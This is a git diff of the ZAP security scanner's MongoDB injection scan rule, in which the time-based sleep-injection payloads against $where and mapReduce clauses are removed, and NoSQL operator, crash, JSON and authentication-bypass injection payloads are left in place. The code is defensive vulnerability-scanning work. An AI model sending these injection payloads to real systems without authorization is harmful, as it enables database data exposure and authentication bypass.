@@ -20,7 +20,6 @@
 package org.zaproxy.zap.extension.ascanrulesAlpha;
 
 import java.io.IOException;
-import java.net.SocketTimeoutException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -57,81 +56,17 @@ public class MongoDbInjectionScanRule extends AbstractAppParamPlugin {
     // Constants
     private static final String ALL_DATA_ATTACK = "alldata";
     private static final String CRASH_ATTACK = "crash";
-    private static final String SLEEP_ATTACK = "sleep";
     private static final String JSON_ATTACK = "json";
     private static final String AUTH_BYPASS_ATTACK = "authbypass";
     private static final String JSON_TOKEN = "$ZAP";
-    private int SLEEP_SHORT_TIME, SLEEP_LONG_TIME;
-    private static final String INSERT_SHORT_TIME = "INSERT_SHORT_TIME",
-            INSERT_LONG_TIME = "INSERT_LONG_TIME";
-    private static final int SHORT_THRESHOLD = 1500;
-    private static final int LONG_THRESHOLD = 3000;
     // Packages of attack rules
     private static final String[] ALL_DATA_PARAM_INJECTION =
             new String[] {"[$ne]", "[$regex]", "[$gt]", "[$eq]"};
     private static final String[] ALL_DATA_VALUE_INJECTION = new String[] {"", ".*", "0", ""};
     private static final String[] CRASH_INJECTION = new String[] {"\"", "'", "//", "});", ");"};
-    private static final String[][] SLEEP_INJECTION = {
-        // Attacking $where clause
-        // function() { var x = md5( some_input ); return this.password == x;}
-        {
-            "'); sleep(" + INSERT_SHORT_TIME + "); print('",
-            "'); sleep(" + INSERT_LONG_TIME + "); print('"
-        },
-        {
-            "\"); sleep(" + INSERT_SHORT_TIME + "); print(\"",
-            "\"); sleep(" + INSERT_LONG_TIME + "); print(\""
-        },
-        {
-            "0); sleep(" + INSERT_SHORT_TIME + "); print(\"",
-            "0); sleep(" + INSERT_LONG_TIME + "); print(\""
-        },
-        // function() { var x = this.value == some_input; return x;}
-        {
-            "'; sleep(" + INSERT_SHORT_TIME + "); var x='",
-            "'; sleep(" + INSERT_LONG_TIME + "); var x='"
-        },
-        {
-            "\"; sleep(" + INSERT_SHORT_TIME + "); var x=\"",
-            "\"; sleep(" + INSERT_LONG_TIME + "); var x=\""
-        },
-        {"0; sleep(" + INSERT_SHORT_TIME + ")", "0; sleep(" + INSERT_LONG_TIME + ")"},
-        // function() { return this.value == some_input }
-        {
-            "zap' || sleep(" + INSERT_SHORT_TIME + ") && 'zap'=='zap",
-            "zap' || sleep(" + INSERT_LONG_TIME + ") && 'zap'=='zap"
-        },
-        {
-            "zap\" || sleep(" + INSERT_SHORT_TIME + ") && \"zap\"==\"zap",
-            "zap\" || sleep(" + INSERT_LONG_TIME + ") && \"zap\"==\"zap"
-        },
-        {"0 || sleep(" + INSERT_SHORT_TIME + ")", "0 || sleep(" + INSERT_LONG_TIME + ")"},
-        // function() { return this.value == some_function(some_imput) }
-        {
-            "zap') || sleep(" + INSERT_SHORT_TIME + ") && hex_md5('zap",
-            "zap') || sleep(" + INSERT_LONG_TIME + ") && md5('zap"
-        },
-        {
-            "zap\") || sleep(" + INSERT_SHORT_TIME + ") && md5(\"zap",
-            "zap\") || sleep(" + INSERT_LONG_TIME + ") && md5(\"zap"
-        },
-        {"0)  || sleep(" + INSERT_SHORT_TIME, "0) || sleep(" + INSERT_LONG_TIME},
-        // Attacking mapReduce clause (only for old versions of mongodb)
-        {
-            "_id);}, function(inj) { sleep("
-                    + INSERT_SHORT_TIME
-                    + ");return 1;}, { out: 'x'}); "
-                    + "db.injection.mapReduce(function() { emit(1,1",
-            "_id);}, function(inj) { sleep("
-                    + INSERT_LONG_TIME
-                    + "); return 1;}, { out: 'x'}); "
-                    + "db.injection.mapReduce(function() { emit(1,1"
-        }
-    };
     private static final String[][] JSON_INJECTION = {{"$ne", "0"}, {"$gt", ""}, {"$regex", ".*"}};
     // Log prints
     private static final String JSON_EX_LOG = "trying to convert the payload in json format";
-    private static final String IO_EX_LOG = "trying to send an http message";
     private static final String URI_EX_LOG = "trying to get the message's Uri";
     private static final String STOP_LOG = "Stopping the scan due to a user request";
     private static final Logger LOGGER = LogManager.getLogger(MongoDbInjectionScanRule.class);
@@ -151,7 +86,6 @@ public class MongoDbInjectionScanRule extends AbstractAppParamPlugin {
     private boolean isJsonPayload;
     private boolean doAllDataScan;
     private boolean doCrashScan;
-    private boolean doTimedScan;
     private boolean doJsonScan;
     private boolean getMoreConfidence;
     private boolean doAuthBypass;
@@ -220,21 +154,15 @@ public class MongoDbInjectionScanRule extends AbstractAppParamPlugin {
         LOGGER.debug("Initialising MongoDB penetration tests");
         switch (this.getAttackStrength()) {
             case LOW:
-                SLEEP_SHORT_TIME = 1000;
-                SLEEP_LONG_TIME = 2000;
                 doCrashScan = false;
                 doAllDataScan = true;
-                doTimedScan = true;
                 doJsonScan = true;
                 getMoreConfidence = false;
                 doAuthBypass = true;
                 break;
             default:
-                SLEEP_SHORT_TIME = 1000;
-                SLEEP_LONG_TIME = 3000;
                 doCrashScan = true;
                 doAllDataScan = true;
-                doTimedScan = true;
                 doJsonScan = true;
                 getMoreConfidence = true;
                 doAuthBypass = true;
@@ -358,98 +286,6 @@ public class MongoDbInjectionScanRule extends AbstractAppParamPlugin {
                 }
             }
         }
-        // injection attack to $Where and $mapReduce clauses
-        // The $where clause executes associated JS function one time for each tuple --> sleep time
-        // = interval * nTuples
-        if (!isBingo && doTimedScan) {
-            if (isStop()) {
-                LOGGER.debug(STOP_LOG);
-                return;
-            }
-            LOGGER.debug("Starting with the javascript code injection payloads:");
-            int aveRtt = getAveRtts(rtt),
-                    index = 0,
-                    timeShort = SLEEP_SHORT_TIME,
-                    timeLong = SLEEP_LONG_TIME;
-            String phase = null;
-            boolean hadTimeout = false;
-            String sleepValueToInj;
-            while (index < SLEEP_INJECTION.length) {
-                if (isStop()) {
-                    LOGGER.debug(STOP_LOG);
-                    return;
-                }
-                LOGGER.debug("Trying  with the value: {}", SLEEP_INJECTION[index][0]);
-                try {
-                    msgInjAttack = getNewMsg();
-                    sleepValueToInj =
-                            SLEEP_INJECTION[index][0].replaceFirst(
-                                    INSERT_SHORT_TIME, Integer.toString(timeShort));
-                    phase = INSERT_SHORT_TIME;
-                    setParameter(msgInjAttack, param, sleepValueToInj);
-                    sendAndReceive(msgInjAttack, false);
-                    LOGGER.debug(
-                            "Trying for a longer time with the value: {}",
-                            SLEEP_INJECTION[index][1]);
-                    if (msgInjAttack.getTimeElapsedMillis() >= aveRtt + SHORT_THRESHOLD) {
-                        phase = INSERT_LONG_TIME;
-                        sleepValueToInj =
-                                SLEEP_INJECTION[index][1].replaceFirst(
-                                        INSERT_LONG_TIME, Integer.toString(timeLong));
-                        msgInjAttack = getNewMsg();
-                        setParameter(msgInjAttack, param, sleepValueToInj);
-                        sendAndReceive(msgInjAttack, false);
-                        if (msgInjAttack.getTimeElapsedMillis() >= aveRtt + LONG_THRESHOLD) {
-                            newAlert()
-                                    .setConfidence(Alert.CONFIDENCE_HIGH)
-                                    .setParam(param)
-                                    .setAttack(sleepValueToInj)
-                                    .setOtherInfo(getExtraInfo(SLEEP_ATTACK))
-                                    .setMessage(msgInjAttack)
-                                    .raise();
-                            isBingo = true;
-                            break;
-                        }
-                    }
-                    if (hadTimeout) {
-                        newAlert()
-                                .setConfidence(Alert.CONFIDENCE_LOW)
-                                .setParam(param)
-                                .setAttack(sleepValueToInj)
-                                .setOtherInfo(getExtraInfo(SLEEP_ATTACK))
-                                .setMessage(msgInjAttack)
-                                .raise();
-                        isBingo = true;
-                        break;
-                    }
-                    index++;
-                } catch (SocketTimeoutException ex) {
-                    hadTimeout = true;
-                    if (INSERT_LONG_TIME.equals(phase)) {
-                        // Timeout: 40s --> 14 <= n. tuples < 40
-                        timeShort /= 3;
-                        timeLong /= 3;
-                    } else {
-                        // n. tuples >= 40
-                        timeShort /= 10;
-                        timeLong /= 10;
-                    }
-                    LOGGER.debug(
-                            "Caught {} {} when {} due to socket timeout, trying with the lowest interval({})",
-                            ex.getClass().getName(),
-                            ex.getMessage(),
-                            IO_EX_LOG,
-                            timeLong);
-                } catch (IOException ex) {
-                    LOGGER.debug(
-                            "Caught {} {} when {}",
-                            ex.getClass().getName(),
-                            ex.getMessage(),
-                            IO_EX_LOG);
-                    return;
-                }
-            }
-        }
         // json query injection
         if (!isBingo && doJsonScan && isJsonPayload) {
             LOGGER.debug("Starting with the json injection payloads:");
@@ -564,14 +400,6 @@ public class MongoDbInjectionScanRule extends AbstractAppParamPlugin {
                 }
             }
         }
-    }
-
-    private static int getAveRtts(List<Integer> rtt) {
-        double sum = 0;
-        for (Integer i : rtt) {
-            sum += i;
-        }
-        return (int) sum / rtt.size();
     }
 
     private static String getParamJsonString(String param, String[] params) throws JSONException {
